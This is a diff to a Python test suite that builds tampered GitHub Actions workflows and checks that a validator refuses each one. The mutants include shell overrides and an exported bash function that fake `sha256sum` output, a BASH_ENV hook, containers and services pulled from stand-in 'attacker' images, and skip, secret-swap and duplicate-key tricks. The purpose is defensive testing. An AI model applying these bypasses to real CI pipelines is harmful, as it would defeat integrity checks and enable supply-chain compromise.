@@ -75,6 +75,68 @@ ADMISSION_MUTANTS = {
     "P2 head-SHA binding removed": (_I + '[ "$live_head_sha" = "$run_head_sha" ]\n', ""),
     "P3 candidate read from main": ('ci.yml?ref=$live_head_sha"', 'ci.yml?ref=main"'),
 }
+# Mutants around the admission text: everything the run text alone does not pin.
+# A: shell and environment hooks that replace `sha256sum` or run code first (A1 step
+# shell, A2 job container, A3 workflow defaults shell, A4 exported bash function, A5
+# BASH_ENV); S: step keys that skip or soften the check; V: step env value swaps;
+# J/W: job- and workflow-level keys; L: the other jobs; D: a duplicate key whose last
+# value is the reviewed one. The reviewed structure must refuse every one (ADR 0212).
+_ADMISSION_RUNNER = "    runs-on: ubuntu-24.04\n    permissions:\n      actions: read\n"
+_SURFACE_RUNNER = "    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n"
+_STEP_ID = "        id: identity\n"
+_TOP_PERMISSIONS = "permissions:\n  contents: read\n\nconcurrency:"
+_FAKE_HASH = "sha256sum() { echo \"$CONSUMER_WORKFLOW_SHA256  -\"; }"
+WORKFLOW_MUTANTS = {
+    "A1 step shell overrides sha256sum": (
+        _STEP_ID, _STEP_ID + f"        shell: bash -c '{_FAKE_HASH}; export -f sha256sum; bash -e {{0}}'\n"),
+    "A2 job container": (
+        _ADMISSION_RUNNER,
+        _ADMISSION_RUNNER.replace("    permissions:", "    container: ghcr.io/attacker/sha256sum:latest\n    permissions:", 1)),
+    "A3 workflow defaults shell": (
+        _TOP_PERMISSIONS,
+        f"defaults:\n  run:\n    shell: bash -c '{_FAKE_HASH}; export -f sha256sum; bash -e {{0}}'\n\n"
+        + _TOP_PERMISSIONS),
+    "A4 job env exports a bash function": (
+        _ADMISSION_RUNNER,
+        _ADMISSION_RUNNER.replace(
+            "    permissions:",
+            "    env:\n      BASH_FUNC_sha256sum%%: () { echo \"$CONSUMER_WORKFLOW_SHA256  -\"; }\n    permissions:", 1)),
+    "A5 job env BASH_ENV": (
+        _ADMISSION_RUNNER,
+        _ADMISSION_RUNNER.replace("    permissions:", "    env:\n      BASH_ENV: /tmp/hook.sh\n    permissions:", 1)),
+    "S1 step if false": (_STEP_ID, _STEP_ID + "        if: false\n"),
+    "S2 step continue-on-error": (_STEP_ID, _STEP_ID + "        continue-on-error: true\n"),
+    "S3 step working-directory": (_STEP_ID, _STEP_ID + "        working-directory: /tmp\n"),
+    "V1 REPOSITORY from the head repository": (
+        "          REPOSITORY: ${{ github.repository }}\n",
+        "          REPOSITORY: ${{ github.event.pull_request.head.repo.full_name }}\n"),
+    "V2 RUN_ID pinned to an old run": (
+        "          RUN_ID: ${{ github.run_id }}\n", "          RUN_ID: 38918542699\n"),
+    "V3 GH_TOKEN from a secret": (
+        "          GH_TOKEN: ${{ github.token }}\n", "          GH_TOKEN: ${{ secrets.ADMISSION_TOKEN }}\n"),
+    "W1 workflow env": (_TOP_PERMISSIONS, "env:\n  BASH_ENV: /tmp/hook.sh\n\n" + _TOP_PERMISSIONS),
+    "J1 job services": (
+        _ADMISSION_RUNNER,
+        _ADMISSION_RUNNER.replace("    permissions:", "    services:\n      hook:\n        image: ghcr.io/attacker/hook:latest\n    permissions:", 1)),
+    "J2 job defaults": (
+        _ADMISSION_RUNNER,
+        _ADMISSION_RUNNER.replace("    permissions:", "    defaults:\n      run:\n        shell: sh {0}\n    permissions:", 1)),
+    "J3 job continue-on-error": (
+        _ADMISSION_RUNNER,
+        _ADMISSION_RUNNER.replace("    permissions:", "    continue-on-error: true\n    permissions:", 1)),
+    "L1 package-surface container": (
+        _SURFACE_RUNNER,
+        _SURFACE_RUNNER.replace("    permissions:", "    container: ghcr.io/attacker/verifier:latest\n    permissions:", 1)),
+    "L2 package-surface verifier continue-on-error": (
+        "      - name: Verify and exercise the package surface\n",
+        "      - name: Verify and exercise the package surface\n        continue-on-error: true\n"),
+    "L3 protected lane extra input": (
+        "      node-version: '26'\n", "      node-version: '26'\n      secretless-trusted-ref: true\n"),
+}
+DUPLICATE_KEY_MUTANT = (
+    "    if: github.repository == 'Verjson/verjson-cli-projects'\n",
+    "    if: always()\n    if: github.repository == 'Verjson/verjson-cli-projects'\n",
+)
 ADMITTED_DIGEST_MUTANT = ("CONSUMER_WORKFLOW_SHA256: d23be004f196ce321965bd07d3f4fa221374d61270215ed17ed5f228239bc117",
               f"CONSUMER_WORKFLOW_SHA256: {_LEGACY}")
 
@@ -257,43 +319,58 @@ class CliProjectsPackageSurfaceRulesetTest(unittest.TestCase):
         workflow.write_text(rendered, encoding="utf-8")
         return scripts / "gen-node-required-workflow.py", workflow
 
-    def test_reviewed_admission_text_is_the_committed_step(self):
-        workflow = yaml.safe_load(MODULE.WORKFLOW.read_text(encoding="utf-8"))
-        self.assertEqual(MODULE.ADMISSION_RUN, workflow["jobs"]["admission"]["steps"][0]["run"])
+    def assert_workflow_mutant_refused(self, anchor, replacement, message):
+        committed = MODULE.WORKFLOW.read_text(encoding="utf-8")
+        self.assertEqual(1, committed.count(anchor), "mutant anchor drifted")
+        with tempfile.TemporaryDirectory() as directory:
+            generator, workflow = self.render_with_mutated_generator(directory, anchor, replacement)
+            rendered = workflow.read_text(encoding="utf-8")
+            self.assertNotEqual(committed, rendered)
+            # GitHub must also be able to read the mutant, so the refusal is not a
+            # side effect of malformed YAML.
+            yaml.safe_load(rendered)
+            with (
+                mock.patch.object(MODULE, "GENERATOR", generator),
+                self.assertRaisesRegex(MODULE.ContractError, message),
+            ):
+                MODULE.validate_workflow(workflow)
 
     def test_workflow_refuses_every_admission_text_but_the_reviewed_one(self):
         # Byte equality with the generator cannot catch a widened generator: both sides
         # move together. Only the reviewed constant can, and a denylist over bash cannot.
-        committed = MODULE.WORKFLOW.read_text(encoding="utf-8")
         for label, (anchor, replacement) in ADMISSION_MUTANTS.items():
-            with self.subTest(label), tempfile.TemporaryDirectory() as directory:
-                self.assertEqual(1, committed.count(anchor), f"{label} anchor drifted")
-                generator, workflow = self.render_with_mutated_generator(
-                    directory, anchor, replacement
+            with self.subTest(label):
+                self.assert_workflow_mutant_refused(
+                    anchor, replacement, "required workflow is not the reviewed structure"
                 )
-                self.assertNotEqual(committed, workflow.read_text(encoding="utf-8"))
-                with (
-                    mock.patch.object(MODULE, "GENERATOR", generator),
-                    self.assertRaisesRegex(
-                        MODULE.ContractError, "identity admission is not the reviewed text"
-                    ),
-                ):
-                    MODULE.validate_workflow(workflow)
+
+    def test_workflow_refuses_every_change_around_the_admission_text(self):
+        for label, (anchor, replacement) in WORKFLOW_MUTANTS.items():
+            with self.subTest(label):
+                self.assert_workflow_mutant_refused(
+                    anchor, replacement, "required workflow is not the reviewed structure"
+                )
 
     def test_workflow_refuses_an_admitted_digest_other_than_the_generated_caller(self):
-        anchor, replacement = ADMITTED_DIGEST_MUTANT
-        self.assertEqual(1, MODULE.WORKFLOW.read_text(encoding="utf-8").count(anchor))
-        with tempfile.TemporaryDirectory() as directory:
-            generator, workflow = self.render_with_mutated_generator(
-                directory, anchor, replacement
-            )
-            with (
-                mock.patch.object(MODULE, "GENERATOR", generator),
-                self.assertRaisesRegex(
-                    MODULE.ContractError, "admitted digest is not the generated consumer caller"
-                ),
-            ):
-                MODULE.validate_workflow(workflow)
+        self.assert_workflow_mutant_refused(
+            *ADMITTED_DIGEST_MUTANT, "required workflow is not the reviewed structure"
+        )
+
+    def test_workflow_refuses_a_duplicate_key_that_hides_a_reviewed_value(self):
+        self.assert_workflow_mutant_refused(*DUPLICATE_KEY_MUTANT, "duplicate key")
+
+    def test_workflow_loader_refuses_merge_keys_and_malformed_yaml(self):
+        # A merge key resolves differently across YAML parsers, so the structure the
+        # verifier compares might not be the one GitHub runs.
+        merged = "base: &base\n  shell: bash\njobs:\n  admission:\n    <<: *base\n"
+        for text, message in ((merged, "merge key"), ("jobs: [\n", "not valid YAML")):
+            with self.subTest(message), self.assertRaisesRegex(MODULE.ContractError, message):
+                MODULE.load_workflow_document(text)
+
+    def test_reviewed_structure_is_the_committed_workflow(self):
+        document = yaml.safe_load(MODULE.WORKFLOW.read_text(encoding="utf-8"))
+        digest = document["jobs"]["admission"]["steps"][0]["env"]["CONSUMER_WORKFLOW_SHA256"]
+        self.assertEqual(MODULE.reviewed_workflow(digest), document)
 
     def test_identity_admission_rejects_every_untrusted_identity_mutation(self):
         workflow = yaml.safe_load(MODULE.WORKFLOW.read_text(encoding="utf-8"))
